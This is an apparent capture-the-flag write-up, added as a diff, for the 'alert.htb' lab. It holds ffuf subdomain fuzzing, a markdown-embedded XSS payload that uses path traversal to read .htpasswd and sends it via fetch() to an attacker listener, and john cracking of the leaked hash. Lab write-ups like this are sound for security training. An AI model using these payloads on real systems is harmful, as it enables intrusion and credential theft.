@@ -1,0 +1,58 @@
+-- MARKDOWN UPLOAD --
+
+There is a section where one can upload markdown files. This will be utilized later.
+
+-- SUBDOMAIN FUZZING --
+
+Command: ffuf -w wordlist.txt -u http://alert.htb -H "Host:FUZZ.alert.htb" -ac
+   
+A subdomain named statistics was uncovered. Since this subdomain has authentication enabled it contains a .htpasswd file where credentials are stored for HTTPS authentication.
+
+-- CRAFTING PAYLOAD --
+
+<script>
+fetch("http://alert.htb/messages.php?file=filepath")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.xx.xx:8888/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+
+The payload can be used to fetch the content of a file and exfiltrate it onto attacker controlled listener.
+
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.xx.xx:8888/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+
+For the lab the above crafted payload can be used where the content of .htpasswd is exfiltrated on a listener at port 8888.
+
+Upload the crafted payload and click on Share markdown where the link is provided.
+
+Paste the link on the Contact Us Form - which in return successfully provides the content of the .htpasswd file
+
+%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A
+
+URL Decoded: <pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>
+
+-- CRACK THE HASH --
+
+Command: john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long ./hash.txt 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+manchesterunited (albert)     
+1g 0:00:00:00 DONE (2025-01-02 21:05) 16.66g/s 46933p/s 46933c/s 46933C/s bebito..medicina
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+-- LOGIN USING SSH --
+
+-- USER FLAG OBTAINED --
+
+
